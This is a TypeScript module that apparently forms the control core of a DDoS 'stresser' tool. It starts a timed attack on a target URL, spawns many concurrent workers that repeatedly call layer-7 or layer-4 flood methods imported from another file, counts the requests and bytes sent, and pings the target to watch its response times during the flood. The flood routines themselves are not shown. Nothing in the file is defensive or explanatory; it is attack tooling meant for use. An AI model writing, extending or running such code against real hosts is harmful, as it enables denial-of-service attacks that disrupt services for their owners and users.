import { getLayer7Method, getLayer4Method } from "./methods"
import type { MethodType } from "./config"

export type AttackState = {
  id: string
  method: string
  methodType: MethodType
  target: string
  running: boolean
  requests: number
  bytes: number
  startTime: number
  logs: string[]
  pingHistory: { time: number; ms: number }[]
  requestHistory: { time: number; requests: number; bytes: number }[]
}

let state: AttackState | null = null
let historyIv: ReturnType<typeof setInterval> | null = null
let pingIv: ReturnType<typeof setInterval> | null = null
const listeners: Set<(s: AttackState | null) => void> = new Set()

export function getState(): AttackState | null {
  return state
}

export function subscribe(cb: (s: AttackState | null) => void) {
  listeners.add(cb)
  return () => listeners.delete(cb)
}

function notify() {
  listeners.forEach((cb) => cb(state))
}

function log(msg: string) {
  if (state) {
    state.logs.push(`[${new Date().toISOString().slice(11, 19)}] ${msg}`)
    if (state.logs.length > 200) state.logs.shift()
    notify()
  }
}

export function stopAttack() {
  if (state) {
    state.running = false
    if (historyIv) clearInterval(historyIv)
    if (pingIv) clearInterval(pingIv)
    historyIv = null
    pingIv = null
    log("Attack stopped")
    notify()
  }
}

export async function startAttack(
  id: string,
  method: string,
  methodType: MethodType,
  target: string,
  threads: number,
  rpc: number,
  duration: number
) {
  if (state?.running) {
    log("Attack already running")
    return
  }

  const url = target.startsWith("http") ? target : `http://${target}`
  state = {
    id,
    method,
    methodType,
    target: url,
    running: true,
    requests: 0,
    bytes: 0,
    startTime: Date.now(),
    logs: [],
    pingHistory: [],
    requestHistory: [],
  }
  historyIv = setInterval(() => {
    if (state) {
      state.requestHistory.push({
        time: Date.now(),
        requests: state.requests,
        bytes: state.bytes,
      })
      if (state.requestHistory.length > 120) state.requestHistory.shift()
      notify()
    }
  }, 1000)
  log(`Starting ${method} attack on ${url} (${threads} threads, ${duration}s)`)
  notify()

  const floodFn = methodType === "layer7" ? getLayer7Method(method) : getLayer4Method(method)
  if (!floodFn) {
    log(`Method ${method} not available`)
    state.running = false
    if (historyIv) clearInterval(historyIv)
    historyIv = null
    notify()
    return
  }

  const onStats = (req: number, bytes: number) => {
    if (state) {
      state.requests += req
      state.bytes += bytes
      notify()
    }
  }

  const endTime = Date.now() + duration * 1000
  const workers: Promise<void>[] = []

  for (let i = 0; i < threads; i++) {
    workers.push(
      (async () => {
        while (state?.running && Date.now() < endTime) {
          await floodFn(url, rpc, onStats)
        }
      })()
    )
  }

  pingIv = setInterval(async () => {
    if (!state?.running) return
    try {
      const start = Date.now()
      await fetch(state.target, { method: "HEAD", signal: AbortSignal.timeout(5000) })
      const ms = Date.now() - start
      state.pingHistory.push({ time: Date.now(), ms })
      if (state.pingHistory.length > 60) state.pingHistory.shift()
      notify()
    } catch {
      state.pingHistory.push({ time: Date.now(), ms: -1 })
      if (state.pingHistory.length > 60) state.pingHistory.shift()
      notify()
    }
  }, 2000)

  await Promise.all(workers)
  if (pingIv) clearInterval(pingIv)
  if (historyIv) clearInterval(historyIv)
  pingIv = null
  historyIv = null
  if (state) {
    state.running = false
    log(`Attack finished. Total: ${state.requests} req, ${(state.bytes / 1024).toFixed(1)} KB`)
    notify()
  }
}
